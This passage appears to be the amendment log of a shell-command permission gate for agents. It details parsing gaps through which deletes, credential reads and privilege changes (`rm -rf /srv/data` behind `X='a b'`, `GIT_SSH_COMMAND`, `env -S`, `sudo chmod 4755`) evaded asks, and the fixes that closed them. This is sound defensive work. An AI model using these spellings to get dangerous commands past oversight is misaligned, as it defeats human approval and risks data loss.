  *Amendment 2026-10-23 (issue #471, found in the post-merge review of #406):* two defects let a command beside a
  push or post that logs go unasked. (1) The prefix strip kept any quoted assignment word as the program. Bash reads
  `X='a b' cmd`, `X="a b" cmd`, `X=a\ b cmd`, `X=$'a b' cmd`, `X="$Y" cmd` and `X=a'b c'd cmd` as an assignment and
  runs `cmd`, but the gate read an unknown program named `X=a b` and never read `cmd`. So
  `git push origin feature && X='a b' rm -rf /srv/data` logged, also under `deny: [delete]`, and a second post
  behind such a word skipped the posting rules (#396). A word is now an assignment when its `NAME=` (with any
  `[subscript]` and `+`) is unquoted in its source text, so only the value may be quoted. A word whose name or `=` is
  quoted (`'X=a' cmd`, `"X"=a cmd`, `X\=a cmd`) stays the program, as bash runs it, and after `env` or `sudo` a word
  quoted whole is still an assignment (#231). A line continuation in the name (`X\<newline>='a b' cmd`) is dropped
  before the check, as bash drops it. The env-inject scan (#231) reads the value as before. (2) The opaque
  floor fired when the line's category was `opaque_exec` or a part carried `indirection`. An unknown program carries
  the signal `unknown program` instead, so beside a more severe part that logs (`git push origin feature && mytool
  --wipe`, `git push origin feature; kill -9 1`) its ask was dropped. The floor now fires on that signal too, and a
  category line naming `opaque_exec` below ask still lowers it (#178); a rule on `opaque_exec` lowers it only when
  that rule matches the line's dominant part, as for `indirection`. `binds_exact` takes the signal as well, so an
  "always" on such a line covers that exact line, not every later push to the same remote. The differential does
  not run that hook step, so the new tests pin it.
  These steps keep every decision at least as strict as main's. The old reading stays beside the new one as an
  unknown-program part, with main's exec-options scan over it, so `X='a b' ls`, a bare `X='a b'` and a post behind
  one still ask. The store check scans that reading's words first, so a store path in a quoted value
  (`X="$HOME/.exo/state/notes.md" ls`, or the folder a `cd` into the store left) is store_write as before. The old
  reading is kept also when the new one reaches an `env -S` or `--split-string`, so `X="$HOME/.exo/state/notes.md"
  env -S 'ls'` stays store_write and `GIT_SSH_COMMAND='rm -rf /srv/data' env -S 'git fetch'` is still denied under
  `deny: [delete]`. The setter check of a `command` rule (#394) counts a setter under either reading, so `X="$Y" ls`
  (a program from a variable, before) still has to be named by an allow rule that would lower `X="$Y" ls; git push
  --force origin main`. And the parts read from the command behind such a word carry the signal `quoted
  assignment`: `decide` also decides the line with the part `_combine` would put on top without them, as main did,
  and keeps the stricter outcome. That step holds a post followed by a delete or a force push behind a quoted
  assignment (`gh pr comment 5 ... && X='a b' rm -rf /srv/data`) at main's decision. There the delete now outranks
  the post, and the matrix cell, category lines and third-party escalation read the dominant part only (#437), so
  without the step an all-allow or all-log category policy would allow or log what the post's third-party
  escalation asks for, and a deny cell for irreversible public acts would ask. Those steps read one simple
  command at a time, and the new reading also changes what the commands after it see. A `cd` behind a quoted word
  (`X='a b' cd /dev && yarn publish`) moves their folder, as bash runs it, and their store write then outranks the
  publish a deny cell denied (the same as `X=ab cd /dev && yarn publish` on main); a reserved word after one is read
  as after an unquoted assignment (`X='a b' coproc env | cat` a coprocess, where bash runs a program named
  `coproc`); and a value declare reads again is added to the line late. So `classify` also reads a call that has a
  quoted prefix assignment as before, each such word the program, in a call of its own (`Classification.before`),
  and `decide` decides that reading too. The two decisions merge as #399's readings do (`_strictest`): the strictest
  outcome, the widest exposure, each reserved part of either, and each violation as often as one of them lists it,
  with one `and N more on other posts` that counts each entry either left out. Each check the exo-gate hook makes
  past `decide` reads that reading and its own floor, as it reads #399's floor: a post's body file, the required
  executor's body check, who may answer, "once" and the categories that never get a grant; and `binds_exact` binds
  the line as that reading binds. Within the simple command, the
  old reading's store scan reads its own parts and the folder from before the new reading's `cd`, and the late parts
  the new reading adds are signed. Before these, the reviews' differential runs found lowered lines among
  each built-in shell line behind `X='a b'` (`X='a b' coproc env | cat`: credentials deny -> credentials ask;
  `X='a b' cd /dev && ssh -vpls 22 rm -rf /data`: delete deny -> store_write ask; `X='a b' cd ~/.exo && mv keys
  /tmp/k`: credentials deny -> store_write ask) and in an aimed corpus (`gh pr comment 5 ...
  && X='a b' declare -a 'arr=($(rm -rf /srv/data))'`: github_post deny -> delete ask), and with the two in-command
  fixes alone lines still lowered, each a `cd` or a `coproc` behind the quoted word. Rejected:
  dropping the old reading, which lowers those lines and the ones that ask only as an unknown program. Rejected:
  reading a reserved word after an assignment as a program, as bash does: right for both forms, but it changes the
  unquoted form main reads as a coprocess, which this fix leaves alone. Rejected: giving the
  env-inject scan's matching loop the same unquoted-name test. Bash runs `'GIT_SSH_COMMAND=rm -rf /srv/data' git
  fetch` as a program of that name, but main reads the delete in the value and `deny: [delete]` denies the line.
  With the test it would ask. The loop still reads a word with a quoted name as an assignment, which only adds parts.
  The differential (main's `scripts/gate_diff.py` under its built-in policies and those from the reviews, among them
  `command` rules on `git push` beside `opaque_exec: allow`, target and command denies and matrix deny cells) lowers
  nothing on its built-in corpus and on aimed lines: a `cd` or `pushd` into `/dev`, `/proc`, `~/.exo` or `~/.ssh`
  behind each quoting style, also through `builtin`, `command`, `env -S`, `--split-string`, `env -u`, `nice`, `sudo`,
  `timeout` and `exec`, before a publish, a force push, a post, an ssh delete, a secret read or a move of the store's
  keys; a `cd` before one; reserved words and `coproc` after one; environment dumps behind one; values declare and
  friends read again after a post; each quoting style with store, secret and env-inject values (`PATH`, `BASH_ENV`,
  `GIT_SSH_COMMAND`, `PS4`, `LD_PRELOAD`) through each wrapper; and each built-in shell line behind `X='a b'`, with
  their compound forms. The runs and counts are in #546. Earlier versions lowered lines it now covers:
  once main took #468, a merge of the two readings that kept each violation once lowered lines under the posting
  policies (`gh pr comment 5 -R myorg/app --body $'ok\nF' && X='a b' pushd /dev/fd &&
  gh pr comment 5 -R myorg/app --body hi`: both posts miss the footer after the `cd` into a descriptor, store or
  secret folder, and main lists that violation twice, the merge once);
  one that scanned only the new reading's words for store paths lowered a store path in a quoted value from
  store_write; one that dropped the old reading when an `env -S` followed lost store_write and env-inject deletes;
  and one whose setter check read only the new reading allowed `X="$Y" ls; git push --force origin main` by a rule
  on `git push`. The stricter lines are a push that logged, or was allowed, and now asks beside an unknown program or
  a command read behind a quoted assignment (`vcs_push log -> vcs_push ask`), and the command behind one taking the
  line (`opaque_exec allow -> delete ask`): a command read behind a quoted assignment now asks or denies as it does
  alone, and an unknown program (the quoted word read as before) asks beside a push that logged.
  The everyday cost is a script that calls a local tool the gate does not know after a
  push or a post (`git push origin feature && notify-send done`): it asks where it logged. The text of `env -S` or
  `--split-string` is read as a shell line and, since main took #634 (#591), as env's argv too, so a leading
  assignment quoted whole there (`env -S "'X=a b' rm -rf /srv/data"`) no longer hides the command either. The
  spellings #634 did not read are read since main f28934a3 took #707, behind a quoted prefix too (below).
  On main 2cc0c32f (2026-10-25), which took #311, #447, #454 and #316, `gate.readings` lists the line read as
  before, with its own floor and its reading from before #311, after the line's own readings. So `no_grant`,
  `call_approvers` and `body_unseen` read its parts as `decide` does, and so do the hook's body files, its required
  executor check and its approvers for a sudo write's displaced part, which iterate the readings: a store write or
  secret part only that reading has keeps the answer with the principal, once, and a sudo write only it reads keeps
  its displaced part's approvers. An "always" on such a line covers that exact line only (`binds_exact`). The
  hook's grant check (D-075) reads each reading against its own act (2026-10-26, review of #546): a reserved hit in
  the line read as before that differs from that reading's act, or from the act of the part its sudo write displaced
  (#454), keeps the ask, as on main, where that reading was the line. Comparing the hits with the line's own act
  alone let an "always" cover `X='a b' sudo git commit -m x; sudo git commit -m x` under `reserved: [local_write]`,
  and the same with `systemctl enable foo.timer` under `reserved: [schedule]` or `sudo curl` under `reserved:
  [web_read]`, which main asks every time: a costly act ties with the unknown program, comes first and leads the line
  now, so the hit is on the line's own act. Rejected: comparing every hit with the act of the line read as before,
  which keeps the ask on lines main grants (`X='a b' git push origin main` under `reserved: [vcs_push]`, which has no
  hit as read before). Main's `scripts/gate_diff.py` lowers nothing on its built-in corpus or on the aimed corpora
  above with the test lines of #311, #447, #454, #316 and #528 behind `X='a b'` and `X="$Y"`, in front and after the
  first joiner, also in a shell call's own folder.
  Through the exo-gate hook, those prefixed lines under several policy and approval setups, each asked twice with
  an "always" between, lose no ask, exact binding, approver or "once" against main. So do commands across the
  categories (sudo, schedule and sudo write forms among them) behind `X='a b'` and `X="$Y"`, alone and joined by `;`
  or `&&` with the prefix on either side, under a reserved entry for each category a grant may cover and all of them
  at once: no ask that main never lets a grant answer takes one. Some lines ask where main took a grant: a reserved
  entry names a part main never read there (the command behind the quoted word, or the unknown program kept beside
  it), and D-075 keeps a hit on another part than the line's act from a grant. The runs and counts are in #546.
  On main dcab371a (2026-10-26), which took #584 (a `$` form's backslash-newline joined) and D-074 (the home's
  `config.json` a store path, `Classification.ordinary`), each reading keeps the others: the line read as before
  #471 has its own joined reading and its own reading as before D-074, and the reading as before D-074 its own
  reading as before #471. `gate.readings` lists the line's own readings, then those of the line as before D-074,
  then those of the line as before #471. A store name an expansion hides (#320: `~/.exo/pol$(:)icies/gates.yaml`,
  `~/.exo/$(printf policies)/default.yaml`), a quoted one (`~/.exo/pol'icies'/gates.yaml`) and the home's
  `config.json` so hidden, written behind each quoted prefix style, after a push and behind `sudo`, are store writes
  on the new reading alone too, as on main.
  On main 15e60ddb (2026-10-26), which took #514 (each store path a write names is a target), #493 (an ssh host
  stands for an empty target), #515 (a camelCase tool read as its words) and #328 (a quoted heredoc delimiter with a
  space), the simple command's store scan keeps each store path either reading's scan meets, the quoted word's
  first, so a target entry on a later store path reaches the write as on main. The reading as before #471 is its own
  call (`classify` reads it beside the line, each with `_classify_reading`'s budgets and folders), so it keeps
  main's joined reading, its reading as before D-074 and its targets, and `binds_exact` binds the line as that
  reading binds (review 5659099075 of #546). The command behind a quoted word now gets main's later readings too: an
  ssh host behind `X='a b'` is a target of the line, so a rule on it denies `X='a b' ssh buildhost gh pr view 5`,
  which main read as an unknown program and asked.
  On main fa5dfcd8 (2026-10-27), which took #634 (#591: the text of `env -S` read as env's own argv too), #585
  (the lexer reads a `$` form after a backslash-newline), #588 (`$[..]` read as `$((..))`), #612, #516, #579 and
  #586 (the hook's two policy files merged as one stricter reading), the merge changes none of this amendment's
  code. Each of those readings is made inside a reading of the call, so the line read as before #471 makes it too,
  and the `env -S` argv reading sits beside the quoted prefix readings: `X='a b' env -S "'Y=c d' rm -rf
  /srv/data"` is a delete that `deny: [delete]` denies, also after a push or behind `sudo`, where main reads the
  quoted word as the program and asks, or logs beside the push. The hook's grant check for the line read as before
  reads its reserved hits under the pinned and the changed file both, also on each side #586 asks alone, so it
  only keeps an ask.
  On main 58503282 (2026-10-27), which took #635 (#601: store and secret names in any letter case), #652 (#553: a
  `$((` bash reads as a command substitution) and #659 (#651: a tool that replaces text writes the store file it
  names), the merge changes none of this amendment's code either (review 5661669883 of #546). The reading as
  before #471 is a call of its own (`classify` makes it with `_classify_reading`), so every reading main makes of a
  shell line is made in it too: the joined reading (#584), the reading as before D-074 (`ordinary`), the folded
  store names (#601, #635), a glob in a secret store's folder (#594, #609), the store paths each write names (#514,
  #611), an ssh host for an empty target (#493, #610), the `env -S` argv reading (#634), `$\<newline>` (#585, #643)
  and `$((` (#553, #652). `gate.readings` lists each of them after the line's own, `binds_exact` binds the line
  when any of them would, `as_dict` leaves `before` out, and the hook's grant check reads that reading's reserved
  hits under each policy file (#586, #640). A camelCase tool's floor (#515, #602), a file tool's store keys (#494,
  #608) and a replace tool's write (#651, #659) are made only for a call the gate reads by its name and arguments,
  never a shell line, so no such call has a reading as before; it keeps main's readings as they are. A store name
  split by quotes, a backslash or a backslash-newline, or in another letter case, behind a quoted prefix is a store
  write on every reading, and so is a write by a relative name after a `cd` into such a folder there (`X='a b' cd
  ~/.E''XO && cp /tmp/x config.json`): main read the quoted word as the program, never moved the folder and read
  the line as `credentials`, so `deny: [store_write]` asked. A line with a quoted prefix assignment is read again
  as before #471, and with the home's `config.json` its reading as before D-074 has its own reading as before #471
  too: `X='a b' cp /tmp/x ~/.exo/config.json` takes 5 call readings where main takes 2, and 10 where main takes 4
  with the name split by `$\<newline>`. The count does not grow with nesting. A line without one costs what it did.
  On main f28934a3 (2026-10-28), which took #707 (#591: the line env runs read in every spelling of `-S`, beside
  main's own readings of the call in `Classification.split_readings`) and #718 (#491: the stdin a `sudo -s` or `-i`
  shell runs, with the call read as before #491 at the end of its floors), the two layers nest (review 5678114534
  of #546). `classify` reads the call for each reading of its quoted prefix assignments, and `_split_reading`
  reads each of those for each reading of its `env -S` texts. So the line read as before #471 is the call exactly
  as main f28934a3 reads it, its split readings and its reading as before #491 included, and the reading after the
  quoted prefix has split readings of its own. `gate.readings` lists the line's own readings, then those of the
  line as before D-074, before #471 and each split reading, each with its own; `decide`, `binds_exact`,
  `no_grant`, `call_approvers` and the hook's checks read each. `_env_split_lines`, which finds the line env runs,
  reads the prefixes as `_strip_prefix_words` does (`_prefix_assign`), so a quoted prefix hides no `-S` text in
  any spelling: `X='a b' env --split-s="'Y=c d' rm -rf /srv/data"` and `X='a b' sudo -s <<< 'rm -rf /srv/data'`
  are deletes that `deny: [delete]` denies, where main f28934a3 reads the quoted word as the program and asks.
  The hook's bypass asks at the floor first only for main's own reading, which behind a quoted prefix is the line
  read as before #471 (its first split reading, when it has one), so a post main holds there is still held; the
  floor of every other reading, the reading after the quoted prefix and its split readings included, comes after
  the hold, so `X='a b' env -S "gh auth token"` asks at the floor where main's bypass allows it. On main f28934a3,
  `X='a b' env -S 'rm -rf /srv/data'` takes 7 call readings where main takes 3, and `X='a b' cp /tmp/x
  ~/.exo/config.json` 5 where main takes 2.
  *Amendment 2026-10-22 (issue #454):* bash opens a redirection's file as the calling user before `sudo` or `doas`
  runs, so `sudo echo hi > /tmp/f` writes `/tmp/f` either way. Sudo makes the command's own part costly, and the
  write stayed reversible, so the command's `read` outranked it. The line was a `read`. A `categories:` line, a rule
  or an escalation on `local_write` missed it, so `{local_write: ask}` allowed it while `echo hi > /tmp/f` asked.
  Only a deny or reserved entry reached the write (D-075, #191). Now, when the costly `read` or `shell` part of a
  sudo command leads the line, a copy of the first sudo write of the line leads in its place, with that cost. The
  line is a costly `local_write` with the written path as target: it keeps its matrix cell and has the category and
  target it has without sudo. The copy's summary names the part it displaced and the path (`chmod, write /tmp/f`),
  so the card, the ledger and the decision model (D-015) still name the program. The copy keeps that part, and
  `decide` reads the line both ways: with the copy leading, and with that part leading, as before. The stricter
  outcome stands. So a policy that reached the line before still does: `{read: ask}`, an escalation on `read`, a
  scope on the read's target, a rule on the repo of a gh read (`{target: o/r*}: ask` for
  `sudo gh pr view 1 -R o/r > /tmp/f`). An ssh hop gives its host to the displaced part when it has no target, as it
  gave it to that part when it led, so `{target: prod}: ask` still asks for `ssh prod 'sudo echo hi > /srv/out'`,
  and a reserved entry on the host names that part as on main.
  Otherwise the parts stay as they were. A part that outranks the `read` still leads, also one that would tie with a
  costly write, such as an unknown program (`sudo echo hi > /tmp/f; foo` asks as `opaque_exec`). A store path stays
  `store_write`, and `/dev/null` adds no write. A copy made on a nested line (a `$( )`, backticks, `<( )`, an ssh hop)
  is a costly `local_write` part of the line around it. There it would take the lead from a part it ties with, which
  led before as the first of the tie. So `_combine` ranks the parts as before too, each copy as a `read` with its own
  axes. A part that outranks a `read` leads again: an unknown program, or ssh running its stdin. Otherwise the copy
  leads, and the part that led before is the one it displaced. The copy's summary then names that part. Without
  this, `echo $(sudo echo hi > /tmp/f) $(foo)` was allowed and `ssh h1 'sudo echo hi > /tmp/f'; ssh h2 foo` logged
  under the default policy, a rule that denies `opaque_exec` on `prod` only asked for
  `ssh -p 2? prod 'sudo echo hi > /tmp/f' < x.sh`, and `{target: a/b*}: ask` missed
  `sudo gh pr view 9 -R a/b; x=$(sudo echo hi > /tmp/f)`. Each now decides as on main.
  An ssh `-o RemoteCommand=` raises the exposure of the line it runs to `internal`, in place. It raised the copy but
  not the displaced part, and `_combine` ranked the copy as that part, at its old private axes. So an earlier costly
  part took its place: under `{opaque_exec: allow}` and `{target: a/b*}: ask`,
  `sudo ls; ssh -o RemoteCommand='sudo gh pr view 9 -R a/b > /tmp/f' h` logged and `foo; ...` was allowed, where
  main asked. The same held for `-oRemoteCommand=`, `scp -o RemoteCommand=` and a `$( )` in the remote command. Now
  every raise in place goes through one helper, `_raise_axes`, which raises the displaced part with the copy, as the
  hop raises every part. The others are sudo and the privileged wrappers, which make a reversible part costly. A copy
  is costly from the start, so they change no copy today. And `_combine` ranks a copy by its own axes, so a raise
  that missed the displaced part would still not move the lead.
  When both readings give the same outcome, the decision keeps what each found, as an equal level does in `decide`:
  both reasons, the higher exposure and any third party. Before, the copy's reading alone stood, so a scope that made
  the written path private made `ssh prod 'sudo echo hi > /tmp/f'` private, where main had it internal, and a host
  rule beside a costly internal ask cell dropped off the card. The card links to the displaced part (a gh read's
  issue) when the line asks with that part leading, as main's card did. A required executor refuses the body file of
  the displaced part too (`sudo gh pr view 1 -R o/r -F /tmp/b > /tmp/f`), as main did. The ledger view leaves the
  displaced part out, as it leaves out every part, so its command text never reaches the ledger. A redirection on a
  compound around a sudo command (`{ sudo echo hi; } > /tmp/f`) or on another command of the line is not on a sudo
  command, so the dominant part decides there, as on any line. A `code` part never leads a shell line, since the
  interpreter's costly `opaque_exec` part outranks it, so only `read` and `shell` are named. Rejected: making each
  write of a sudo command costly. It then ties with an unknown program later on the line, and the first part wins a
  tie, so `sudo echo hi > /tmp/f; foo` and `while true; do sudo echo hi > /tmp/f; break; done` would be allowed where
  they asked. A rule on a reversible write would also miss it. Also rejected: ranking the reversible write above the
  costly `read`, which moves the line to the reversible cell of the matrix. And deciding the line with the copy alone:
  a line, rule or scope on the displaced part no longer reached it, so a rule on the repo of
  `sudo gh pr view 1 -R o/r > /tmp/f`, or on the host of an ssh line, asked on main and allowed or logged.
  Grants and approvers follow the line's category and target where only the write asks, as under
  `{local_write: ask}`. A standing grant is keyed on them (D-033), so its key moves from a costly `read` or `shell` on
  the tool to `local_write` on the first written path. An "always" for `echo started > /tmp/log` now covers a costly
  sudo command whose first sudo write goes to `/tmp/log`, and a second sudo command on that line, while one for a
  costly `read` on the tool no longer covers it. On main a grant on (`shell`, the tool) was as broad, so the key
  moves rather than widens. A reserved hit keeps the principal's ask from a grant (D-075) on any part of the line,
  the displaced part and the write included. The line is also the act of the part the write displaced, and on main
  the write was another part of that line. Without this, under `reserved: [local_write]`, an "always" on
  `sudo echo hi > /tmp/f` let that line run again with no ask, where main asked each time.
  The approvers follow the new category there too: with approvals.yaml `approvers: {local_write: ["seat:helper"]}`,
  `sudo echo hi > /tmp/log` goes to `[principal, seat:helper]`, as `echo hi > /tmp/log` does.
  Where the displaced part names a target of its own, a gh read's repo or an ssh host, the line is about that target
  too. There a grant on the written path answered a rule on the repo or host: with `{target: prod}: ask` and a grant
  for `echo hi > /srv/out`, `ssh prod 'sudo echo hi > /srv/out'` ran, where main asked. An "always" on that line also
  covered the same write on another host. And the helper above could answer the ask the host rule raised, where main
  asked the principal. The same held where the line asks with the displaced part leading (its category, a rule, a
  cell or an escalation on it) and that part has no target: under `{shell: ask, read: ask}`, an "always" on
  `sudo echo hi > /tmp/f` let `sudo chmod 4755 /usr/bin/python3 > /tmp/f` run with no ask, and under `{shell: ask}`
  the helper answered `sudo chmod u+s /tmp/x > /tmp/log`. So in both cases the line binds its approval to the exact
  command (`binds_exact`), and only those who may answer both categories may answer it. `Decision.displaced_asks`
  tells the hook of the second case, under the pinned or a changed policy. A grant on (`read`, the host) no longer
  covers such a line either.
  *With #399.* #399 landed first. A gh read's other targets (`alt_targets`) stay on the displaced part: the second
  reading is decided on each of them, the ssh hop gives its host to one that is the current repo, the card names
  them when that reading asks, and a displaced part with any of them binds the approval to the exact command. A line #399 also reads as before
  (`floor`) can be a sudo write line in that reading only, as `sudo gh pr "$V" 5 > /tmp/f` is. #399 lets only
  those who may answer that reading's category answer the line. That category is now the write's, so the hook also
  keeps the approvers of that reading's displaced part, always. Without that, with approvals.yaml
  `approvers: {opaque_exec: [seat:h], local_write: [seat:h]}`, `seat:h` answered that line, where main asked the
  principal alone. An ask from the displaced part of any reading is kept when the readings merge (`_strictest`).
  Against main 8c09c29c, which has #399, the differential lowers no pair either: the built-in corpus (67,396
  actions x 87 policies), #399's own corpus (7,014 x 100), its gh lines behind sudo with a write, nested and over
  ssh (26,748 x 126), the five focused corpora above, and 15,750 lines of sudo writes fed to a shell on stdin, in
  heredocs, `eval`, `su -c`, `find -exec`, `xargs`, git and rsync exec options, interpreters, container exec and
  ssh hops (37,308 x 113).
  *Lowered lines.* None. The gate differential (#423) against main 5a9dc394, with main's script, lowers no pair in
  six runs. The built-in corpus: 58,405 actions x 87 policies. 1,564 lines built for this change (sudo and doas with
  options and behind other prefixes, each write redirection, `/dev/null`, store paths, compounds, subshells, `$( )`,
  `bash -c`, `ssh`, `xargs`, heredocs and cd chains): 20,816 actions with their forms, under the built-in policies and
  16 keyed on `read`, `local_write` and cost. 647 lines with the write on other paths and in other places (before the
  command, split by `\<newline>`, behind `time -p`, `exec -a`, `stdbuf` or `ionice`, in loops, `case`, backticks, ssh
  with options or two hops): 8,268 actions, under the built-in policies and 18 keyed on targets, scopes, `shell` and
  `command`. 4,760 lines of gh reads with `-R` or `repos/` paths and other commands, behind sudo, doas and their
  options, with one or two writes, in subshells, braces, cd chains, loops, `$( )`, `bash -c`, heredocs and one or two
  ssh hops: 41,160 actions, under the built-in policies and 19 keyed on the repo, the host and the paths. 3,000 lines
  with a sudo write in a `$( )`, backticks, `<( )`, `bash -c` or an ssh hop beside 34 other commands, in both orders,
  and ssh lines that run their stdin: 6,384 actions, under the built-in policies and 43 keyed on the repo, the host,
  `opaque_exec`, `read`, `shell`, `local_write` and `command`. Before `_combine` ranked nested copies that way, that
  corpus lowered 12,220 pairs on 958 actions. The other four lowered no pair before it either. 10,400 lines with a
  sudo write beside a costly gh read, an unknown program or a post, run by `ssh -o RemoteCommand=` (also
  `-oRemoteCommand=`, `scp` and `sftp`, after `-F`, behind sudo, `env` or `timeout`, in `$( )` and backticks),
  `ProxyCommand`, `LocalCommand`, `KnownHostsCommand`, an ssh hop, `bash -c` or a privileged wrapper: 23,230 actions,
  under the built-in policies and 27 keyed on the repo, the host, `read`, `shell`, `opaque_exec`, exposure, scopes and
  `command`. Before the raise reached the displaced part, it lowered 41,585 pairs on 8,239 actions, the built-in
  `categories_allow` and a deny on an internal `read` among them. Each run only tightens:
  a line keyed on `local_write` or its cell now reaches these lines. After a `cd` into the store or `/dev`, an ssh
  line that runs a sudo write is now a store write that asks, as the same line without sudo is on main. Against this
  change before the nested ranking, 2,088 pairs on 618 actions of the last corpus and 79 pairs on 31 built-in actions
  decide lower: a policy on `local_write` that reached the copy, or one that allows `opaque_exec` or `vcs_push`, now
  meets the part that leads on main. Each decides as on main. The grants and approvers above are outside `decide`, so
  the differential does not count them.
  Against main d79639f1, which adds #440, the differential lowers no pair either: the built-in corpus (67,654
  actions x 87 policies), the `RemoteCommand` corpus above (23,230 x 114), and 8,330 sudo write lines in 17 places
  (`$( )`, ssh hops, `RemoteCommand`, `bash -c`, loops, cd chains into the store and the plugins folder) under the
  built-in policies and 26 more keyed on categories, cells, the repo, the host, reserved and deny entries,
  escalations and `command` (49,490 x 113). A check of the hook steps past `decide` (the exact binding, the
  approvers, the grant key, the reserved check and "once") over those 8,330 lines under the 26 policies finds no
  pair looser than on main, apart from the grant move above where only the write asks. Before the reserved check
  above, it found 2,600 such pairs.
  *Integration 2026-10-24 (#454 with #316):* the pure `_lead` selector uses the same displaced-part ranking as
  `_combine`. An ssh line with a sudo write and unread stdin therefore fills the host on the opaque stdin part
  that leads, as before: `ssh -p 2? prod 'sudo echo hi > /tmp/f' < x.sh` keeps `prod` as its target, so a deny on
  opaque execution at that host still denies. The two existing stdin/sudo regression rows fail without this join.
  *Amendment 2026-10-25 (issue #454, after #492 merged):* #492 merged (0889b351) with 040702d0 and the integration
  fix f8b5e2f7, before the answer to its last review (5640972780) was pushed. This amendment carries that answer. The
  host reaches the displaced part only in the hop form (`ssh prod 'sudo echo hi > /srv/out'`). `ssh -o RemoteCommand=`
  names no host in the line it runs, so no host reaches the copy or the part it displaced, and a rule that asks or
  logs on the host does not reach `ssh -o RemoteCommand='sudo echo hi > /srv/out' prod`. Before #454 that line was
  logged the same way, as a costly `read` with no target, and the line without sudo misses the rule too. So this is
  parity, not a lowering, and issue #493 covers it. ssh's own part still names the host, so a rule that denies it, and
  a deny or reserved entry for it, still reach the line (D-075). The copy's summary names the write under the
  displaced part's program only when the write is on that part's own command.
  `sudo gh pr view 1 -R o/r; sudo echo hi > /tmp/f` read `gh pr view, write /tmp/f`, as if gh wrote the file, and now
  reads `gh pr view; write /tmp/f`. A nested copy whose displaced part is on another command reads the same way. When
  the line asks with the displaced part leading, the card links to that part. A `shell` part with no link, such as
  `chmod`, falls back to the written path as its Link. The copy no longer checks whether that part is a third party,
  since no `read` or `shell` part is one. Against main edeb4f89 the differential lowers and tightens no pair. The
  built-in corpus (71,740 actions x 87 policies) changes nothing else either. 459 lines of sudo writes beside another
  sudo command, after `;`, `&&`, `||` and `|`, behind wrappers, in `bash -c`, `sh -c`, ssh hops,
  `ssh -o RemoteCommand=`, `xargs`, `$( )`, subshells, heredocs and cd chains (1,577 actions x 111 policies, 24 of
  them keyed on the host, the repo, the path, categories, reserved and deny entries, escalations, third party and
  `command`) change 108 pairs in their reason only, where a deny names the new summary. A second corpus of 1,270 lines
  (24 other sudo commands beside a sudo write, the same nests, spellings of sudo and of the redirection, and everyday
  `git`, `make` and `pytest` lines) under 20 more policies (4,014 actions x 107) changes 786 pairs, each only in the
  summary its reason quotes. A third corpus of 488 lines, written for the last review (14 other sudo or doas reads
  beside 8 kinds of write, the same command twice, two writes, 36 stdin, code-string and nest forms, 14 spellings of
  sudo and doas, 12 wrappers and 28 everyday lines), under 26 more policies (2,557 actions x 113) changes 96 pairs,
  each only in that summary, and lowers none. The PR's review re-ran an aimed corpus against main 358c3a39 after #409,
  which also lowered none.
  *Amendment 2026-10-22 (issue #316, follow-up to #240):* ssh's stdin reached its login shell in five more ways the
  gate did not see, so the line read as plain `ssh` and was allowed, even under category denies. (1) A compound fed a
  stdin the gate cannot read: the closer's `<` from anything but a lone `/dev/null`, or a pipe in whose text is not
  known (`{ ssh host; } < cmds.sh`). Where `_feed_compound` fed such commands nothing, it now marks them
  (`stdin_unknown`). (2) A `>( )` body, fed what the command around it writes. Its source stays among the line's
  substitution sources, typed `_OutSub`, so every reader of them still reads it: the cd store read (#192) and the
  declare re-read (#188) lost it in the first draft, which kept these bodies in a list of their own. The declare
  re-read reads a `>( )` body again unless the line read the same text as a `>( )` too. A command in the body that
  sets its own stdin is not fed. (3) A `$( )`, backticks or `<( )` inherits the stdin of the command it sits in. On a
  fed line, or where a pipe or a compound feeds a command, it is read as fed. A command's own `<` is set up after its
  words are expanded, so it does not count. (4) A remote hop. An ssh that passes its stdin on (no `-n`, `-N` or `-f`)
  gives it to its remote command. That command is read a second time, as a line fed that stdin, and when an ssh there
  with no stdin of its own runs it, wherever it sits, behind a wrapper and over more hops (`ssh a 'cd /; ssh b'`, `ssh
  a ssh b ssh c`), the outer ssh is a hop. The ssh part that runs its fed line's stdin carries the signal `runs its
  line's stdin`, which only that second reading looks for. A known text is read as for the direct form. (5) The
  command a wrapper runs (`uv run`, `flock`, `nsenter`...) gets the wrapper's stdin (`_wrapped`): a
  compound's feed, the wrapper's own `<` from anything but `/dev/null` and a pipe into it reach it (`{ uv run ssh
  host; } < cmds.sh`, `uv run ssh host < cmds.sh`, `cat cmds.sh | uv run ssh host`), and a wrapper with a stdin of its
  own keeps a fed line's mark from it (`>(uv run ssh host < /dev/null)`). `xargs` is read the same way, which reads
  more than runs: GNU xargs gives its command `/dev/null` unless `-a` names the file it reads (and `-o` gives it the
  terminal), so a stdin read as run there fails closed. The fed mark is a context variable that
  names one line (`_fed_stdin`), not a classify_shell argument, so code that wraps `classify_shell(cmd, depth)` keeps
  working. As for #240, these lines take the category of what runs. The part that runs the stdin is a part of the line
  beside ssh's own part, not built into it, and ssh's own part keeps the reading it had before #316 (in a hop, the
  remote command read unfed). So sudo or a privileged wrapper around ssh still makes that part `costly`, and a `deny`
  or `reserved` entry still finds the targets and categories it found: ssh's own part names the host as it did where
  ssh read no stdin. The direct #240 form is built the same way. There the part that led when #240 built the parts
  into one still leads on equal parts and takes the host, so the line decides and lists its hits as on main. So `sudo
  ssh host < cmds.sh` is now denied under a rule that denies `costly` `shell` parts, where it asked. Last, a
  `-n`, `-N` or `-f` before a word that may expand to no word or several is an option whatever the word becomes, so
  ssh does not read its stdin then: `while read h; do ssh -n "$h" uptime; done < hosts.txt` keeps its reading, where
  it asked once the compound's feed was read. A `--` before the host ends the options, so a letter after it does not
  count: in `ssh -- -n "$h" < f` ssh takes `-n` as the host, and the line asks as on main.
  *Lowered on purpose:* the new part is `opaque_exec`, or what a known text reads as, and runs on the remote host. It
  can be the line's deciding part (the most severe part, or the first of equal ones), and the steps of `decide` that
  read only that part then read it. A line decides lower than on main in three ways. (a) A policy that allows or logs
  `opaque_exec`, by a category line or a rule (also one keyed on the text that shows where the stdin comes from),
  decides it lower than the displaced part did. That part is sudo's or a privileged wrapper's, which the matrix logs
  or the opaque floor asks about (`{ sudo ssh host; } < cmds.sh`, `nsenter -t 1 ssh host < cmds.sh`), a `git push` or
  `gh pr merge` the matrix logs (`{ ssh host; git push origin main; } < cmds.sh`), or a `shell` part a category line
  logs (`uv run ssh host < cmds.sh` under `categories: {shell: log, opaque_exec: allow}`). Main decides the line where
  the same ssh reads its stdin directly the same way (`sudo ssh host < cmds.sh`, `ssh host < cmds.sh; git push origin
  main`), and a privileged wrapper as the same wrapper around a shell that reads it (`nsenter -t 1 bash < cmds.sh`).
